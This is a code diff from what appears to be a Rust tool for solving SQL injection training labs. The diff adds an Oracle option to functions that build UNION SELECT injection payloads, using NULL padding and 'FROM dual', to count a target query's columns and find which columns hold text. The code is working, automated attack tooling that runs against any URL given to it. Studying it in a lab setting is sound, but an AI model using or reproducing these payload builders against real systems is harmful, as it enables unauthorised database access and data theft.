@@ -90,8 +90,13 @@ pub fn fetch_target_string(lab_url: &str, pattern: Option<&LazyLock<Regex>>) -> 
     target_string.to_string()
 }
 
-pub fn find_no_of_columns(lab_url_with_end_point: &str, comment: Option<&str>) -> usize {
+pub fn find_no_of_columns(
+    lab_url_with_end_point: &str,
+    comment: Option<&str>,
+    oracle: Option<bool>,
+) -> usize {
     let comment = comment.unwrap_or("--");
+    let oracle: bool = oracle.unwrap_or(false);
 
     logger::info("Determining the number of columns using UNION SELECT...");
 
@@ -99,7 +104,12 @@ pub fn find_no_of_columns(lab_url_with_end_point: &str, comment: Option<&str>) -
 
     loop {
         let payload = repeat_n("NULL", columns).collect::<Vec<&str>>().join(", ");
-        let query = format!("' UNION SELECT {}{}", payload, comment);
+        let query = format!(
+            "' UNION SELECT {} {} {}",
+            payload,
+            if oracle { "FROM dual" } else { "" },
+            comment
+        );
 
         logger::info(
             format!(
@@ -137,8 +147,10 @@ pub fn find_columns_of_type_string(
     lab_url_with_end_point: &str,
     no_of_columns: usize,
     comment: Option<&str>,
+    oracle: Option<bool>,
 ) -> Vec<usize> {
     let comment = comment.unwrap_or("--");
+    let oracle: bool = oracle.unwrap_or(false);
 
     logger::info("Finding columns that contain text...");
 
@@ -150,7 +162,12 @@ pub fn find_columns_of_type_string(
             .collect::<Vec<&str>>()
             .join(", ");
 
-        let query = format!("' UNION SELECT {}{}", payload, comment);
+        let query = format!(
+            "' UNION SELECT {} {} {}",
+            payload,
+            if oracle { "FROM dual" } else { "" },
+            comment
+        );
 
         logger::info(format!("Making query {}: {}{}", i, lab_url_with_end_point, query).as_ref());
 
